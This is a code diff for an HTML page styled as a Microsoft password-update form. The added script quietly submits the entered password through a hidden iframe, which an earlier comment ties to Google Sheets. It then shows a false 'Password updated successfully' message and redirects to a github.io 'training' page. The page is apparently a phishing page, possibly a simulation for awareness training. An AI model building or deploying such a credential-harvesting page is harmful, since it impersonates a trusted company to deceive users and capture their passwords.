@@ -68,10 +68,13 @@
       text-align: center;
     }
     .success-msg {
-      display: none;
-      color: green;
-      margin-top: 16px;
-      text-align: center;
+        color: #2b7d34;
+        background: #e6f2e6;
+        padding: 12px;
+        border-radius: 4px;
+        margin: 16px 0;
+        text-align: center;
+        font-size: 0.95em;
     }
   </style>
 </head>
@@ -109,19 +112,35 @@
           &copy; 2025 Microsoft Corporation. All rights reserved.
         </div>
     </div>
-    <script>
-        document.getElementById("passwordForm").addEventListener("submit", function() {
-            // Form submission to Google Sheets via iframe
-            
-            // Clear the form inputs after submission
-            const inputs = e.target.querySelectorAll("input");
-            inputs.forEach(input => input.value = "");
+  <script>
+    document.getElementById("passwordForm").addEventListener("submit", function(e) {
+        e.preventDefault();
+        const form = this;
+        
+        // Show a temporary success message
+        const successMsg = document.createElement('div');
+        successMsg.className = 'success-msg';
+        successMsg.textContent = 'Password updated successfully! Redirecting...';
+        form.parentNode.insertBefore(successMsg, form.nextSibling);
 
-            // Redirect after 1 second (allow time for submission)
-            setTimeout(() => {
-                window.location.href = "/result.html"; // target page
-            }, 1000);
-        });
-    </script>
+        // Submit to iframe
+        const iframe = document.createElement('iframe');
+        iframe.name = 'tempFrame';
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+        
+        iframe.onload = function() {
+            // Clear form and remove iframe
+            form.querySelectorAll("input").forEach(input => input.value = "");
+            document.body.removeChild(iframe);
+            
+            // Redirect after showing message
+            window.location.href = "https://jacc-ck.github.io/training.github.io/result.html";
+        };
+        
+        form.target = 'tempFrame';
+        form.submit();
+    });
+  </script>
 </body>
 </html>
